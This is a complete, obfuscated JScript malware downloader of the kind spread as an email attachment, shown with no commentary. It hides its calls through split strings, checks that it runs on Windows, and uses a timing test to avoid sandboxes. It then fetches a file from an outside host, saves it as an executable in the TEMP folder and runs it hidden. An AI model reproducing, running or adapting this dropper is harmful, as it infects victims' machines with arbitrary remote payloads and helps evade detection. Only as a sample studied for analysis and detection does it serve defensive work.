var E = false;
var AD = "Create"+"Object";
var Y = function A() {return WScript[AD]("WScript"+".Shell");}(), TI = 11;
var F = "MSXML2"+".XMLHTTP";
var AL = 2;
var X0 = AL - 2;
function DP(C){Y["Run"](C, X0, X0);};
function U(){return F + "";};
function VL(X1, JB){X0 = X0 * 1; return X1 - JB;};
function GI(){return AD;};
/*@cc_on
  @if (@_win32 || @_win64)
    E = true;
  @end
@*/
if (E)
{
var A0 = "";
function MD(){return 22;};
var Z = 0; var RH = 0;
function X()
{
var DP0 = new this["Date"]();
var LI = DP0["getUTCMilliseconds"]();
WScript["Sleep"](MD());
var DP0 = new this["Date"]();
var DA = DP0["getUTCMilliseconds"]();
WScript["Sleep"](MD());
var DP0 = new this["Date"]();
var LK = DP0["getUTCMilliseconds"]();
var Z = "O";
Z = VL(DA, LI);
var RH = "V";
RH = VL(LK, DA);
A0 = "open";
return VL(Z, RH);
}
var TI0 = false;
var R = false;
for (var VX = X0; VX < MD() * 1; VX++){if (X() != X0){
TI0 = true; 
RH = "31" + 11 * Z + RH; 
R = true; 
break;
}}
function AZ() {return ((TI0 == true) && (TI0 == R)) ? 1 : X0;};
if (TI0 && AZ() && R){
function B() {return Y["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "JYW7I91Wxr3ov.ex" + "e";};
 HM = U();
 VX0 = WScript[AD](HM);
 var P = 1;
do { 
	for (;P;){
	try {
		if (P == 1)
		{
			VX0[A0]("GET", "http://buygrocery.nz/l7dsp", false);
			VX0["send"]();
			MP = "Sleep";
			P = 2;
		}
		WScript[MP](MD() + 120); 
		if (VX0["readystate"] < 2 * 2) continue;
		P = X0;
		function ZU(AA) {var WJ = (1, 2, 3, 4, 5, AA); return WJ;};
		P0 = WScript[GI()]("ADODB.Stream");
		HM = P0;
		HM[A0]();
		HM["type"] = ZU(1);
		HM["write"](VX0["ResponseBody"]);
		P0["position"] = ZU(X0);
		HM["Save" + "ToFile"](B(), 2);
		P0["cl"+"ose"]();
		N = B();
		DP(N);
	} catch(WB){};};
}while (P);
}
}

